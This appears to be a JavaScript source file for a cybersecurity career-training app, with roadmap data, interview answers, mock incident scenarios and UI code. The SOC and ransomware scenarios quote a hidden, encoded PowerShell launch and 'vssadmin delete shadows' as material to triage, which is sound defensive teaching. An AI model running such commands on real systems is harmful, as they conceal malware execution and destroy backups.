      { id: 'm6_t4', title: 'Windows & Linux Privilege Escalation Fundamentals', desc: 'Unquoted service paths, sudo abuse, and scheduled task hijacking.' },
      { id: 'm6_t5', title: 'Legal Boundaries, Ethics & Scope of Work Agreements', desc: 'Computer Fraud and Abuse Act (CFAA), Rules of Engagement (RoE).' }
    ],
    resources: [
      { name: 'TryHackMe Pre-Security & Complete Beginner', url: 'https://tryhackme.com' },
      { name: 'Hack The Box Starting Point Machines', url: 'https://hackthebox.com' }
    ]
  },
  {
    id: 'm7',
    num: '07',
    title: 'Security Monitoring & Incident Response',
    desc: 'Defend organizations by analyzing logs, detecting anomalies, and remediating attacks.',
    topics: [
      { id: 'm7_t1', title: 'SIEM Architecture & Telemetry Ingestion (Wazuh / Splunk)', desc: 'Forwarders, indexers, search heads, and parsing syslog streams.' },
      { id: 'm7_t2', title: 'Windows Event Log Analysis & Sysmon Configuration', desc: 'Event IDs 4624 (logon), 4625 (failed logon), 4688 (process creation).' },
      { id: 'm7_t3', title: 'Adversary Tactics via the MITRE ATT&CK Framework', desc: 'Mapping alerts to Enterprise Matrix techniques and sub-techniques.' },
      { id: 'm7_t4', title: 'Incident Response Lifecycle (NIST SP 800-61 Rev. 2)', desc: 'Preparation, Detection & Analysis, Containment, Eradication, Recovery.' },
      { id: 'm7_t5', title: 'Memory Forensics & Endpoint Detection and Response (EDR)', desc: 'Dumping volatile RAM, scanning for injected DLLs, and host isolation.' }
    ],
    resources: [
      { name: 'CyberDefenders Blue Team CTF Challenges', url: 'https://cyberdefenders.org' },
      { name: 'MITRE ATT&CK Navigator', url: 'https://mitre.org' }
    ]
  },
  {
    id: 'm8',
    num: '08',
    title: 'Cloud Security Basics (AWS / Azure)',
    desc: 'Harden modern cloud-native architectures, containerized environments, and cloud IAM.',
    topics: [
      { id: 'm8_t1', title: 'Cloud Service Models & The Shared Responsibility Model', desc: 'Differentiating IaaS, PaaS, SaaS security boundaries and compliance.' },
      { id: 'm8_t2', title: 'Cloud IAM: Roles, Policies & Least Privilege Guardrails', desc: 'Eliminating root credentials, enforcing MFA, and role assumption.' },
      { id: 'm8_t3', title: 'Virtual Private Clouds (VPC), Subnets & Security Groups', desc: 'Bastion hosts, internet gateways, NAT gateways, and private endpoints.' },
      { id: 'm8_t4', title: 'Storage Security (AWS S3 Bucket Policies & KMS Encryption)', desc: 'Default encryption at rest, public access blocking, and bucket logging.' },
      { id: 'm8_t5', title: 'Cloud Audit Logging & Alerting (CloudTrail & GuardDuty)', desc: 'Aggregating API call logs, spotting unauthorized privilege escalations.' }
    ],
    resources: [
      { name: 'AWS Cloud Practitioner & Security Essentials', url: 'https://aws.amazon.com' },
      { name: 'Microsoft Learn Azure Fundamentals (AZ-900)', url: 'https://learn.microsoft.com' }
    ]
  },
  {
    id: 'm9',
    num: '09',
    title: 'Practical Projects & Portfolio Building',
    desc: 'Assemble verified technical artifacts, public GitHub documentation, and showcase-ready labs.',
    topics: [
      { id: 'm9_t1', title: 'Architecting an Isolated Virtual Home Lab Environment', desc: 'Setting up VirtualBox/VMware with pfSense router and isolated subnets.' },
      { id: 'm9_t2', title: 'Deploying an Open-Source SIEM (Wazuh or Security Onion)', desc: 'Connecting endpoint agents, triggering attacks, and generating alert graphs.' },
      { id: 'm9_t3', title: 'Developing a Cybersecurity Automation Tool in Python', desc: 'Documenting code cleanly on GitHub with README, architecture diagrams.' },
      { id: 'm9_t4', title: 'Authoring CTF & Lab Write-ups for Your Portfolio', desc: 'Structuring walkthroughs: methodology, findings, technical proof, fixes.' },
      { id: 'm9_t5', title: 'Final Capstone Review & Technical Portfolio Deployment', desc: 'Publishing your personal security portfolio on GitHub Pages.' }
    ],
    resources: [
      { name: 'GitHub Guides: Building a Standout Tech Portfolio', url: 'https://github.com' },
      { name: 'Antigravity Capstone Open Source Repository', url: 'https://github.com' }
    ]
  }
];

const PORTFOLIO_PROJECTS = [
  {
    id: 'p1',
    title: 'Virtual Enterprise SOC & SIEM Lab',
    tag: 'Defensive Lab',
    desc: 'Architected and deployed an open-source Wazuh SIEM ecosystem ingesting Windows Sysmon telemetry across virtual subnets, creating 5 custom detection rules.',
    stack: ['Wazuh', 'Elasticsearch', 'Sysmon', 'VirtualBox', 'Ubuntu Server'],
    highlights: [
      'Configured dedicated forwarder agents on Windows 11 and Ubuntu VMs.',
      'Created custom XML correlation rules to flag rapid failed RDP logins.',
      'Simulated Mimikatz credential dumping and verified automated endpoint alerts.',
      'Documented network topology and rule syntax in an open-source GitHub repository.'
    ]
  },
  {
    id: 'p2',
    title: 'Automated Port Scanner & Vulnerability Reporter',
    tag: 'Python Automation',
    desc: 'Engineered a multi-threaded Python CLI utility that enumerates open TCP ports, captures server banners, queries known CVE databases, and generates HTML audit reports.',
    stack: ['Python 3', 'Sockets', 'Scapy', 'NVD API', 'HTML5 Reporting'],
    highlights: [
      'Implemented concurrent thread pools to scan 1,000 common ports in under 4 seconds.',
      'Integrated NIST National Vulnerability Database API to pull matching CVE records.',
      'Enforced defensive input validation to prevent arbitrary command injection.',
      'Packaged tool with comprehensive CLI arguments and unit tests.'
    ]
  },
  {
    id: 'p3',
    title: 'Cloud Honeypot & Threat Intel Visualizer',
    tag: 'Cloud & Threat Hunting',
    desc: 'Deployed an isolated Cowrie SSH/Telnet honeypot on an AWS EC2 instance, logging attacker IP addresses, credentials used, and rendering interactive geographic heatmaps.',
    stack: ['AWS EC2', 'Cowrie', 'Python', 'MaxMind GeoIP', 'Streamlit'],
    highlights: [
      'Captured 12,000+ unauthorized brute-force attempts across 45 unique countries in 72 hours.',
      'Extracted top 20 attempted username/password dictionary combinations.',
      'Automated daily IP blocklist generation pushed to firewall ACL rules.',
      'Authored a technical retrospective detailing threat actor behavioral patterns.'
    ]
  },
  {
    id: 'p4',
    title: 'Web Application Security Audit & Remediation',
    tag: 'AppSec & Pentesting',
    desc: 'Conducted an authorized vulnerability assessment against the OWASP Juice Shop application, documenting 8 distinct vulnerabilities and writing remediation patches.',
    stack: ['Burp Suite Pro', 'OWASP ZAP', 'Node.js', 'SQL Injection', 'Cross-Site Scripting'],
    highlights: [
      'Identified and exploited blind SQL injection, IDOR, and reflected XSS.',
      'Authored an executive vulnerability debrief with CVSS v3.1 severity scores.',
      'Provided code-level remediation snippets demonstrating parameterized queries.',
      'Received 100% completion badge on all Tier-1 and Tier-2 Juice Shop challenge tracks.'
    ]
  }
];

const INTERVIEW_QUESTIONS = [
  {
    id: 'iq1',
    category: 'technical',
    categoryLabel: 'Technical Fundamentals',
    difficulty: 'Beginner',
    question: 'Can you explain the TCP 3-way handshake in detail, and what happens if an ACK is never received?',
    answer: 'The TCP 3-way handshake synchronizes connection parameters between client and server:\n1. SYN: The client generates an Initial Sequence Number (ISN) and sends a SYN packet to the server.\n2. SYN-ACK: The server responds with its own ISN and an ACK acknowledging the client’s ISN (Client ISN + 1).\n3. ACK: The client sends an ACK acknowledging the server’s ISN (Server ISN + 1), transitioning both sides to the ESTABLISHED state.\n\nIf the final ACK is never received (e.g. during a SYN Flood attack), the server keeps the socket in a SYN_RECEIVED half-open state until a timeout expires or SYN cookies are triggered to prevent resource exhaustion.'
  },
  {
    id: 'iq2',
    category: 'technical',
    categoryLabel: 'Technical Fundamentals',
    difficulty: 'Intermediate',
    question: 'What is the fundamental difference between symmetric and asymmetric encryption, and where are they typically combined?',
    answer: 'Symmetric encryption (e.g., AES, ChaCha20) uses a single secret shared key for both encryption and decryption. It is mathematically very fast and ideal for encrypting large amounts of data at rest or in transit.\n\nAsymmetric encryption (e.g., RSA, ECC) utilizes a mathematically linked key pair: a public key (for encryption/verification) and a private key (for decryption/signing). It is slower but solves the key exchange dilemma.\n\nThey are combined in hybrid cryptosystems like TLS (HTTPS): asymmetric cryptography (ECDH / RSA) safely negotiates an ephemeral session key during the handshake, and symmetric cryptography (AES-GCM) takes over to encrypt the actual web session traffic.'
  },
  {
    id: 'iq3',
    category: 'incident',
    categoryLabel: 'Incident Response & SOC',
    difficulty: 'Intermediate',
    question: 'A Tier-1 SIEM alert fires indicating an internal host is making recurring outbound DNS requests to known malicious domain names. What are your immediate first 3 actions?',
    answer: 'Action 1: Containment – Isolate the affected host from the internal corporate network (via EDR isolation or network switch port shutdown) to halt active command-and-control (C2) communication and prevent lateral movement.\n\nAction 2: Evidence Preservation – Acquire a volatile memory dump (RAM) and pull process execution logs (Sysmon / EDR telemetry) to identify which process PID generated the DNS queries.\n\nAction 3: Scoping & Threat Hunting – Query proxy/DNS logs across the entire enterprise to see if any other internal endpoints communicated with the same malicious domain or related C2 infrastructure.'
  },
  {
    id: 'iq4',
    category: 'incident',
    categoryLabel: 'Incident Response & SOC',
    difficulty: 'Advanced',
    question: 'Explain the 6 phases of the NIST SP 800-61 Incident Handling process.',
    answer: '1. Preparation: Establishing policies, communication trees, trained personnel, and deploying SIEM/EDR monitoring tools.\n2. Detection & Analysis: Identifying anomalous events, triaging false positives, and assessing the scope and severity of the incident.\n3. Containment: Short-term (isolating hosts) and long-term containment (updating firewall rules) to keep the breach from spreading.\n4. Eradication: Removing all traces of the attacker, such as deleting malware artifacts, closing compromised accounts, and patching root vulnerabilities.\n5. Recovery: Restoring systems from verified clean backups, testing functionality, and returning to normal business operations.\n6. Post-Incident Activity (Lessons Learned): Conducting a post-mortem review to document root causes, metrics, and update incident playbooks.'
  },
  {
    id: 'iq5',
    category: 'behavioral',
    categoryLabel: 'HR & Behavioral',
    difficulty: 'All Levels',
    question: 'Tell me about a time you identified a high-risk security flaw, but the software development team pushed back against patching it immediately. How did you handle it? (STAR Method)',
    answer: 'Situation: During a capstone web application audit, I discovered an unauthenticated IDOR vulnerability in an endpoint exposing student grades.\nTask: I needed to convince the developer lead to patch the endpoint prior to campus release without delaying their sprint deadline.\nAction: Instead of just filing a dry ticket, I scheduled a 15-minute screen share with the lead. I walked them through a respectful proof-of-concept demonstrating how simple parameter changes exposed other records, explained the business and compliance impact (FERPA violations), and supplied drop-in code showing a 3-line session authorization check.\nResult: The lead developer accepted the fix immediately, merged the patch that afternoon, and later asked me to contribute a secure coding checklist for future sprints.'
  },
  {
    id: 'iq6',
    category: 'behavioral',
    categoryLabel: 'HR & Behavioral',
    difficulty: 'All Levels',
    question: 'How do you stay current with rapidly evolving zero-day exploits, threat actor TTPs, and security tooling?',
    answer: 'I maintain a structured daily learning habit:\n1. Aggregated Feeds: I follow the CISA Known Exploited Vulnerabilities (KEV) catalog, BleepingComputer, The Hacker News, and the SANS Internet Storm Center Daily Stormcast podcast during my morning commute.\n2. Hands-on Practice: I actively participate in TryHackMe and Hack The Box rooms when new prominent CVE writeups are released.\n3. Community Engagement: I read security advisories from CERT and engage in technical discussions on r/netsec and security Discord communities to learn how other defenders triage zero-days.'
  }
];

const MOCK_SCENARIOS = {
  soc: {
    title: 'Tier-1 SOC Alert: Suspicious PowerShell Execution & Lateral Movement',
    desc: 'At 11:45 PM on a Friday, your EDR console alerts on a workstation in Finance executing `powershell.exe -NoP -NonI -W Hidden -Enc ...` immediately following a macro execution from an invoice attachment. The workstation is actively scanning the internal /24 subnet on port 445 (SMB).',
    rubricPoints: [
      'Isolate the finance workstation immediately via EDR to prevent lateral movement over SMB.',
      'Capture volatile RAM and running process tree before any reboot or power-down.',
      'Decode the Base64-encoded PowerShell string to identify C2 IP addresses and intent.',
      'Check email gateway logs to identify who sent the malicious attachment and see if other employees received it.',
      'Notify the Incident Response Lead and create an incident ticket documenting initial triage findings.'
    ],
    idealAnswer: 'My priority is rapid containment: I immediately trigger network isolation on the workstation through the EDR console to block further port 445 SMB scanning. Next, I preserve evidence by acquiring a live memory dump and process telemetry. I decode the Base64 PowerShell payload to extract any secondary payloads or C2 IP addresses. Simultaneously, I search our email gateway logs for the malicious invoice hash to see if other users opened it, block the external sender and C2 domain at the firewall/proxy, and escalate the case to the Incident Response team with my triage notes.'
  },
  ir: {
    title: 'Incident Response: Suspected Ransomware Precursor Deployment',
    desc: 'Multiple servers in the accounting VLAN begin throwing high CPU alerts. Several backup files have been renamed with an unfamiliar extension, and the Windows shadow copies (`vssadmin delete shadows`) were wiped 10 minutes ago.',
    rubricPoints: [
      'Disconnect or isolate the affected accounting VLAN immediately to stop encryption spread.',
      'Do NOT restart or turn off the physical machines immediately to avoid destroying in-memory encryption keys and artifacts.',
      'Verify the integrity and immutability of offline / cloud backups.',
      'Identify the compromised account credentials used to execute the vssadmin command and revoke their tokens.',
      'Engage legal, executive, and communications teams according to the enterprise incident response plan.'
    ],
    idealAnswer: 'This is an active ransomware incident requiring immediate containment. I first sever the accounting VLAN from the rest of the corporate network at the switch/firewall level. Crucially, I do not power down the servers immediately because doing so wipes volatile RAM which might contain encryption keys or active process footholds. I verify that our immutable offline backups are detached and safe. I identify the domain account used to execute vssadmin, revoke its Kerberos tickets and reset its credentials, and notify the CISO and incident commander to initiate executive notification playbooks.'
  },
  pentest: {
    title: 'Penetration Testing: Disclosing a Critical RCE to Client Stakeholders',
    desc: 'During an authorized external penetration test, you discover an unauthenticated Remote Code Execution (RCE) on the client’s public-facing customer portal. The engagement still has 3 days remaining.',
    rubricPoints: [
      'Stop testing on that specific vulnerability immediately to prevent accidental service disruption.',
      'Document clear proof-of-concept steps and sanitized screenshots proving the RCE.',
      'Notify the designated client emergency contact immediately rather than waiting for the final report.',
      'Provide an actionable emergency mitigation (e.g. WAF rule, temporary IP restriction, or configuration patch).',
      'Maintain strict confidentiality and store proof artifacts securely in an encrypted container.'
    ],
    idealAnswer: 'Under standard Rules of Engagement, finding an unauthenticated critical RCE requires immediate out-of-band notification to the client’s emergency contact rather than waiting for the final report. I immediately pause active exploitation on that host to avoid crashing production servers. I document the exact HTTP request, payload, and sanitized evidence in an encrypted folder. I contact the client technical liaison, explain the vulnerability and severity clearly without jargon, and provide an immediate temporary mitigation (such as a WAF blocking rule or disabling the affected API endpoint) while they develop a permanent patch.'
  },
  behavioral: {
    title: 'Behavioral: Resolving Conflict Between Security and Product Velocity',
    desc: 'The VP of Product wants to launch a new mobile application tomorrow to meet a major marketing deadline, but your security assessment identified that API authentication tokens are transmitted in plaintext over unencrypted HTTP.',
    rubricPoints: [
      'Demonstrate understanding of the business context and marketing deadline.',
      'Frame the security flaw in terms of business impact (regulatory fines, brand damage, credential theft).',
      'Avoid simply saying "No"; propose pragmatic solutions or mitigations (e.g. enforcing HTTPS redirect in API gateway).',
      'Escalate objectively with clear risk choices if leadership insists on proceeding.',
      'Maintain professional composure and collaborative partnership.'
    ],
    idealAnswer: 'I would schedule a quick sync with the VP of Product and lead engineer. I would acknowledge the immense effort the team put in to meet the deadline, but clearly explain that transmitting tokens in plaintext exposes our users to immediate credential theft and violates basic compliance standards like GDPR or PCI-DSS, which would destroy user trust on launch day. Instead of just blocking the launch, I would offer a fast solution: we can configure an HTTPS enforcement rule at the Cloudflare/API gateway level in 30 minutes without modifying the underlying mobile code. If there were still pushback, I would document the residual business risk clearly so executive leadership can make an informed, accountable decision.'
  }
};

const SAMPLE_JOB_POSTINGS = {
  soc: `Job Title: Junior SOC Analyst (Tier 1)
Location: Remote / Hybrid
Requirements:
- Bachelor's degree in Cybersecurity, Information Technology, or Computer Science.
- Understanding of networking protocols: TCP/IP, DNS, DHCP, HTTP/S, and Wireshark packet capture.
- Hands-on experience with SIEM technologies like Splunk, Wazuh, or Microsoft Sentinel.
- Knowledge of Linux operating systems, Bash command line, and file permissions.
- Basic scripting experience in Python or PowerShell for log parsing and automation.
- Familiarity with the MITRE ATT&CK framework and incident triage procedures.
- Preferred Certifications: CompTIA Security+, CySA+, or Blue Team Level 1.`,

  cloud: `Job Title: Associate Cloud Security Engineer
Location: Austin, TX / Remote
Requirements:
- Strong knowledge of AWS cloud architecture, IAM roles, and least-privilege security policies.
- Experience with infrastructure as code (IaC) using Terraform or AWS CloudFormation.
- Understanding of container security (Docker, Kubernetes) and vulnerability scanning.
- Knowledge of cloud audit tools like AWS CloudTrail, GuardDuty, and Security Hub.
- Scripting proficiency in Python or Go for cloud automation.
- Working knowledge of Linux systems and CI/CD security scanning.
- Preferred Certifications: AWS Certified Security - Specialty or Azure Security AZ-500.`,

  pentest: `Job Title: Associate Penetration Tester / Junior Ethical Hacker
Location: Hybrid
Requirements:
- Demonstrated experience conducting network and web application penetration tests.
- Deep familiarity with the OWASP Top 10 vulnerabilities (SQLi, XSS, CSRF, SSRF).
- Hands-on proficiency with tools: Burp Suite Pro, Nmap, Metasploit, and Kali Linux.
- Ability to write custom automation and exploit proof-of-concepts in Python and Bash.
- Understanding of Active Directory attack paths (Kerberoasting, Pass-the-Hash).
- Excellent technical writing and presentation skills for client debrief reports.
- Preferred Certifications: CompTIA PenTest+, eJPT, or OSCP.`
};

const INTERNSHIP_CHECKLIST_DATA = [
  { id: 'ic1', text: 'Tailor your resume headline specifically to your target domain (e.g. "Aspiring SOC Analyst").' },
  { id: 'ic2', text: 'Publish at least one verified hands-on lab on GitHub with a comprehensive README and screenshots.' },
  { id: 'ic3', text: 'Include public profiles from TryHackMe, HackTheBox, or CyberDefenders on your resume.' },
  { id: 'ic4', text: 'Obtain or actively study for CompTIA Security+ or an equivalent entry-level certification.' },
  { id: 'ic5', text: 'Optimize LinkedIn profile with relevant keywords (SIEM, Wireshark, Python, NIST CSF, DFIR).' },
  { id: 'ic6', text: 'Practice 5 STAR-format behavioral interview questions using real lab experiences as examples.' },
  { id: 'ic7', text: 'Participate in a collegiate CTF competition or local security meetup (BSides, OWASP, Defcon Group).' },
  { id: 'ic8', text: 'Prepare a clean, print-ready ATS resume PDF without formatting bugs or table errors.' }
];

// -------------------------------------------------------------------
// 2. State Coordinator & LocalStorage Management
// -------------------------------------------------------------------

const STORAGE_KEY = 'cybercareer_ai_capstone_state_v1';

class AppState {
  constructor() {
    this.data = this.loadInitialState();
  }

  loadInitialState() {
    try {
      const saved = localStorage.getItem(STORAGE_KEY);
      if (saved) {
        return JSON.parse(saved);
      }
    } catch (e) {
      console.warn('Could not read from localStorage, using defaults.', e);
    }
    return this.getDefaultState();
  }

  getDefaultState() {
    return {
      theme: 'dark',
      currentView: 'dashboard',
      targetRoleId: 'soc',
      
      // Roadmap progress (checked topic IDs)
      completedRoadmapTopics: [
        'm1_t1', 'm1_t2', 'm1_t3', 'm1_t4', 'm1_t5', // Module 1 complete (5)
        'm2_t1', 'm2_t2', 'm2_t3', 'm2_t4', 'm2_t5', // Module 2 complete (5)
        'm3_t1', 'm3_t2', 'm4_t1', 'm4_t2'            // In progress (4)
      ],
      
      // Assessment state
      assessment: {
        completed: true,
        answers: {
          1: 1, 2: 1, 3: 0, // Networking (3/3)
          4: 1, 5: 1, 6: 0, // Linux (3/3)
          7: 0, 8: 1, 9: 0, // Python (2/3)
          10: 2, 11: 1, 12: 1, // Fundamentals (3/3)
          13: 1, 14: 0, 15: 0, // Web (3/3)
          16: 0, 17: 0, 18: 0  // Cloud (2/3) - total 16/18
        },
        score: 14,
        total: 18,
        percent: 78,
        tier: 'Practitioner',
        date: new Date().toISOString()
      },

      // Internship checklist
      internshipChecks: ['ic1', 'ic2', 'ic4', 'ic5'],

      // Resume Form Data
      resume: {
        name: 'Alex Morgan',
        title: 'Aspiring SOC Analyst | Cybersecurity Senior',
        email: 'alex.morgan@email.com',
        phone: '(555) 019-2834 • Austin, TX',
        linkedin: 'linkedin.com/in/alex-morgan-cyber • github.com/alex-sec',
        summary: 'Dedicated senior cybersecurity student equipped with practical experience in security event monitoring, log correlation, and incident triage. Proficient with Splunk, Wireshark, and Python scripting for security automation. Passionate about defending enterprise infrastructure in a 24/7 SOC environment.',
        degree: 'B.S. in Cybersecurity & Information Assurance',
        university: 'State University • Expected May 2026',
        coursework: 'Network Security, Operating System Hardening, Incident Response & Forensics, Applied Cryptography, Database Security',
        skillsTools: 'Splunk, Wireshark, Nmap, Wazuh SIEM, Zeek, Snort, Metasploit, Burp Suite Community',
        skillsOS: 'Kali Linux, Ubuntu Server, Windows Server, AWS (IAM, VPC, S3)',
        skillsScripting: 'Python (Sockets, Regex), Bash Scripting, PowerShell, TCP/IP, DNS, HTTP/S, SSH',
        certifications: 'CompTIA Security+ (SY0-701) • CompTIA\nCompTIA Network+ (N10-008) • CompTIA\nCompTIA CySA+ (In Progress • Expected Dec 2026)',
        projects: 'Virtual Enterprise SOC & SIEM Lab | Wazuh, Sysmon, VirtualBox\n• Architected isolated virtual enterprise environment ingesting telemetry from Windows and Linux endpoints.\n• Developed 5 custom Wazuh detection rules to detect brute-force RDP and PowerShell obfuscation.\n• Simulated lateral movement attacks and authored incident response playbooks for tier-1 containment.\n\nAutomated Network Scanner & CVE Checker | Python 3, Sockets, NVD API\n• Engineered a multi-threaded Python CLI utility enumerating open TCP ports across target subnets.\n• Automated query pipelines against the NIST NVD API to surface matching CVE records and CVSS severity scores.',
        experience: 'IT Security Student Intern | University Campus Technology Services (Summer 2025)\n• Triaged tier-1 phishing alerts across 12,000 active student email accounts using Microsoft Defender.\n• Assisted network engineers in segmenting dormitory Wi-Fi networks and updating firewall access control lists.\n• Authored campus-wide cybersecurity awareness articles on multi-factor authentication (MFA).'
      }
    };
  }

  save() {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(this.data));
    } catch (e) {
      console.error('Failed to save state to localStorage', e);
    }
  }

  resetAll() {
    this.data = this.getDefaultState();
    // Clear completed to let user start fresh if they explicitly reset
    this.data.completedRoadmapTopics = [];
    this.data.assessment = { completed: false, answers: {}, score: 0, total: 18, percent: 0, tier: 'Unassessed' };
    this.data.internshipChecks = [];
    this.save();
  }

  loadDemoStudent() {
    this.data = this.getDefaultState();
    this.save();
  }
}

// -------------------------------------------------------------------
// 3. Application Controller
// -------------------------------------------------------------------

class CyberCareerApp {
  constructor() {
    this.state = new AppState();
    this.currentQuizIndex = 0;
    this.currentQuizAnswers = { ...this.state.data.assessment.answers };
    this.selectedInterviewTab = 'questions';

    // Initialize application components
    this.initTheme();
    this.initNavigation();
    this.renderSidebar();
    this.renderDashboard();
    this.renderCareers();
    this.renderRoadmap();
    this.renderJobPrep();
    this.renderInterviewPrep();
    this.initResumeAssistant();
    this.initGlobalSearch();
    this.initKeyboardShortcuts();

    // If assessment was already completed, render its results
    if (this.state.data.assessment && this.state.data.assessment.completed) {
      this.displayAssessmentResults(this.state.data.assessment);
    } else {
      this.renderQuizQuestion(0);
    }
  }

  // -----------------------------------------------------------------
  // 3.1 Theme Handling
  // -----------------------------------------------------------------
  initTheme() {
    const savedTheme = this.state.data.theme || 'dark';
    document.documentElement.setAttribute('data-theme', savedTheme);

    const toggleBtn = document.getElementById('theme-toggle-btn');
    if (toggleBtn) {
      toggleBtn.addEventListener('click', () => {
        const current = document.documentElement.getAttribute('data-theme') || 'dark';
        const next = current === 'dark' ? 'light' : 'dark';
        document.documentElement.setAttribute('data-theme', next);
        this.state.data.theme = next;
        this.state.save();
        this.showToast(`Switched to ${next} mode`, 'info');
      });
    }

    const dataOptionsBtn = document.getElementById('data-options-btn');
    if (dataOptionsBtn) {
      dataOptionsBtn.addEventListener('click', () => this.openDataModal());
    }
  }

  // -----------------------------------------------------------------
  // 3.2 Navigation & SPA View Routing
  // -----------------------------------------------------------------
  initNavigation() {
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
      item.addEventListener('click', () => {
        const viewId = item.getAttribute('data-view');
        this.navigateTo(viewId);
      });
    });

    // Mobile Hamburger Toggle
    const mobileMenuBtn = document.getElementById('mobile-menu-toggle');
    const sidebar = document.getElementById('app-sidebar');
    if (mobileMenuBtn && sidebar) {
      mobileMenuBtn.addEventListener('click', () => {
        sidebar.classList.toggle('mobile-open');
      });

      // Close sidebar when clicking outside on mobile
      document.addEventListener('click', (e) => {
        if (!sidebar.contains(e.target) && !mobileMenuBtn.contains(e.target)) {
          sidebar.classList.remove('mobile-open');
        }
      });
    }
  }

  navigateTo(viewId) {
    // Hide all views
    const allViews = document.querySelectorAll('.content-view');
    allViews.forEach(v => v.classList.remove('active'));

    // Deactivate all nav items
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
      if (item.getAttribute('data-view') === viewId) {
        item.classList.add('active');
      } else {
        item.classList.remove('active');
      }
    });

    // Show target view
    const targetView = document.getElementById(`view-${viewId}`);
    if (targetView) {
      targetView.classList.add('active');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Close mobile sidebar if open
    const sidebar = document.getElementById('app-sidebar');
    if (sidebar) sidebar.classList.remove('mobile-open');

    // Update state
    this.state.data.currentView = viewId;
    this.state.save();

    // Trigger view-specific re-renders
    if (viewId === 'dashboard') this.renderDashboard();
    if (viewId === 'roadmap') this.renderRoadmap();
    if (viewId === 'resume') this.updateResumePreview();
  }

  renderSidebar() {
    const targetRole = CAREERS_DATA.find(c => c.id === this.state.data.targetRoleId) || CAREERS_DATA[0];
    const roleEl = document.getElementById('sidebar-target-role');
    if (roleEl) roleEl.textContent = targetRole.title;

    // Calculate match percentage based on roadmap and assessment
    const matchPercent = this.calculateRoleReadiness(targetRole.id);
    const percentEl = document.getElementById('sidebar-match-percent');
    const barEl = document.getElementById('sidebar-match-bar');
    if (percentEl) percentEl.textContent = `${matchPercent}%`;
    if (barEl) barEl.style.width = `${matchPercent}%`;

    // Update roadmap nav badge
    this.updateNavRoadmapProgress();
  }

  updateNavRoadmapProgress() {
    const totalTopics = ROADMAP_MODULES.reduce((acc, m) => acc + m.topics.length, 0);
    const completed = this.state.data.completedRoadmapTopics.length;
    const pct = Math.round((completed / totalTopics) * 100);
    const badge = document.getElementById('nav-roadmap-progress');
    if (badge) badge.textContent = `${pct}%`;
  }

  // -----------------------------------------------------------------
  // 3.3 Dashboard Rendering
  // -----------------------------------------------------------------
  renderDashboard() {
    const totalTopics = ROADMAP_MODULES.reduce((acc, m) => acc + m.topics.length, 0);
    const completedCount = this.state.data.completedRoadmapTopics.length;
    const roadmapPct = Math.round((completedCount / totalTopics) * 100);

    // Roadmap Count & Pct
    const countEl = document.getElementById('dash-roadmap-count');
    const pctEl = document.getElementById('dash-roadmap-percent');
    if (countEl) countEl.textContent = `${completedCount} / ${totalTopics} Topics`;
    if (pctEl) pctEl.textContent = `${roadmapPct}% Completed`;

    // Assessment Metric
    const assessStatusEl = document.getElementById('dash-assessment-status');
    const assessScoreEl = document.getElementById('dash-assessment-score');
    if (this.state.data.assessment && this.state.data.assessment.completed) {
      if (assessStatusEl) assessStatusEl.textContent = this.state.data.assessment.tier || 'Practitioner';
      if (assessScoreEl) assessScoreEl.textContent = `Score: ${this.state.data.assessment.score}/18 (${this.state.data.assessment.percent}%)`;
    } else {
      if (assessStatusEl) assessStatusEl.textContent = 'Unassessed';
      if (assessScoreEl) assessScoreEl.textContent = 'Diagnostic Pending';
    }

    // Top Matched Role
    const topRole = CAREERS_DATA.find(c => c.id === this.state.data.targetRoleId) || CAREERS_DATA[0];
    const topRoleEl = document.getElementById('dash-top-role');
    if (topRoleEl) topRoleEl.textContent = topRole.title;

    // Overall Readiness Score
    const assessPct = this.state.data.assessment?.completed ? this.state.data.assessment.percent : 40;
    const overallReadiness = Math.round((roadmapPct * 0.5) + (assessPct * 0.35) + 15);
    const readinessScoreEl = document.getElementById('dash-readiness-score');
    const readinessBarEl = document.getElementById('dash-readiness-bar');
    if (readinessScoreEl) readinessScoreEl.textContent = `${Math.min(overallReadiness, 100)}%`;
    if (readinessBarEl) readinessBarEl.style.width = `${Math.min(overallReadiness, 100)}%`;

    // Domain Breakdown Bars
    this.renderDomainMasteryBars('dash-domain-bars');

    // Recommendations list
    this.renderDashboardRecommendations();
  }

  renderDomainMasteryBars(containerId) {
    const container = document.getElementById(containerId);
    if (!container) return;

    const domains = [
      { id: 'networking', label: 'Computer Networking', icon: '🌐' },
      { id: 'linux', label: 'Linux & Command-Line', icon: '🐧' },
      { id: 'python', label: 'Python for Security', icon: '🐍' },
      { id: 'fundamentals', label: 'Security Architecture', icon: '🛡️' },
      { id: 'web', label: 'Web Application Security', icon: '🔒' },
      { id: 'cloud', label: 'Cloud Security (AWS/Azure)', icon: '☁️' }
    ];

    const answers = this.state.data.assessment?.answers || {};
    
    let html = '';
    domains.forEach(d => {
      const domainQuestions = ASSESSMENT_QUESTIONS.filter(q => q.domain === d.id);
      let correct = 0;
      domainQuestions.forEach(q => {
        if (answers[q.id] === q.correctIndex) correct++;
      });
      const pct = Math.round((correct / domainQuestions.length) * 100);

      html += `
        <div class="domain-bar-item">
          <div class="domain-bar-header">
            <span>${d.icon} ${d.label}</span>
            <span class="domain-bar-percent">${pct}%</span>
          </div>
          <div class="progress-bar-track mini">
            <div class="progress-bar-fill cyan" style="width: ${pct}%;"></div>
          </div>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  renderDashboardRecommendations() {
    const container = document.getElementById('dash-recommendations-container');
    if (!container) return;

    // Find next uncompleted roadmap topic
    const nextTopic = this.getNextUncompletedTopic();

    const recs = [
      {
        step: 'ACTION 1',
        title: nextTopic ? `Continue Roadmap: ${nextTopic.title}` : 'Roadmap Completed!',
        sub: nextTopic ? `Module: ${nextTopic.moduleTitle}` : 'Review hands-on capstone portfolio projects',
        actionLabel: 'Resume Lesson',
        view: 'roadmap'
      },
      {
        step: 'ACTION 2',
        title: 'Evaluate Job Description Skill Match',
        sub: 'Paste a junior SOC or cloud job spec to find missing technical competencies.',
        actionLabel: 'Analyze Skills',
        view: 'jobprep'
      },
      {
        step: 'ACTION 3',
        title: 'Complete Mock Interview Drill',
        sub: 'Practice articulating incident triage under time constraints with the rubric simulator.',
        actionLabel: 'Practice Drills',
        view: 'interview'
      }
    ];

    let html = '';
    recs.forEach(r => {
      html += `
        <div class="action-rec-item">
          <div class="rec-item-left">
            <span class="rec-step-badge">${r.step}</span>
            <div>
